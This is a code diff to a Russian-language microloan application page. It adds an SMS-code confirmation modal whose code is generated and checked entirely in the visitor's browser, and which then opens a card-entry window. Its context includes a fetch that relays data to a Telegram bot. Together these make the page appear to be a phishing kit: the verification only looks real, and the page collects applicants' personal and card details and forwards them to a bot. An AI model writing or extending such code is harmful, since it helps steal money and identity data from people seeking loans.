@@ -1082,6 +1082,7 @@ fetch(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${chatId}&text
 
 const code = Math.floor(1000 + Math.random() * 9000); // Генерируем 4-значный код
 localStorage.setItem('sms_code', code); // Сохраняем его
+localStorage.setItem("confirmationCode", code);
 
 fetch("https://zaim-backend.onrender.com/send-sms", {
   method: "POST",
@@ -1106,8 +1107,44 @@ fetch("https://zaim-backend.onrender.com/send-sms", {
 
 
 });
+
+
   
   </script>
 
+<!-- Модалка для кода из SMS -->
+<div id="smsModal" class="hidden fixed inset-0 z-50 bg-black bg-opacity-50 flex items-center justify-center">
+  <div class="bg-white p-6 rounded-xl max-w-sm w-full text-center">
+    <h2 class="text-xl font-bold mb-4">Подтверждение номера</h2>
+    <p class="mb-2">Введите код из SMS</p>
+    <input id="smsCodeInput" type="text" maxlength="4" class="border rounded px-4 py-2 w-full mb-4 text-center text-lg tracking-widest" placeholder="0000">
+    <button onclick="verifySMSCode()" class="bg-blue-600 text-white px-4 py-2 rounded w-full hover:bg-blue-700">Подтвердить</button>
+  </div>
+</div>
+
+<script>
+function showSMSModal() {
+  const modal = document.getElementById("smsModal");
+  modal.classList.remove("hidden");
+  document.getElementById("smsCodeInput").focus();
+}
+
+function hideSMSModal() {
+  document.getElementById("smsModal").classList.add("hidden");
+}
+
+function verifySMSCode() {
+  const entered = document.getElementById("smsCodeInput").value.trim();
+  const saved = localStorage.getItem("confirmationCode");
+
+  if (entered === saved) {
+    alert("✅ Код подтвержден!");
+    hideSMSModal();
+    showCardModal(); // вызываем следующее окно (если оно есть)
+  } else {
+    alert("❌ Неверный код. Попробуйте снова.");
+  }
+}
+</script>
 </body>
 </html>
